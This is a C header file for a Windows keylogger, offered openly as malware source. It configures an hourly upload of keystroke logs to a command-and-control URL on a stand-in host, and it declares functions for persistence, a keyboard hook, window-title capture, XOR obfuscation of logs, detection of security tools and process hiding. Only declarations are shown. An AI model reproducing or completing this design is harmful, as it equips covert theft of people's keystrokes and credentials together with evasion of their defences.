#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdbool.h>

// Configuration
#define LOG_FILENAME "logs.dat"
#define ENCRYPTION_KEY 0x5A
#define SEND_INTERVAL 3600  // Send logs every hour (in seconds)
#define C2_SERVER "http://malicious-server.example.com/upload.php"

// Function declarations
bool installPersistence(void);
bool startKeylogger(void);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
void writeToLog(const char* text);
void encryptData(char* data, size_t length);
bool sendDataToC2(const char* data, size_t length);
bool checkForSecurityTools(void);
bool hideProcess(void);
char* getCurrentWindowTitle(void);
void cleanupKeylogger(void);

// Global variables
extern HHOOK g_keyboardHook;
extern FILE* g_logFile;
extern DWORD g_lastSendTime;

// Structure to hold keystroke information
typedef struct {
    DWORD vkCode;
    DWORD scanCode;
    DWORD flags;
    DWORD time;
    char windowTitle[256];
} KeystrokeInfo;

#endif // KEYLOGGER_H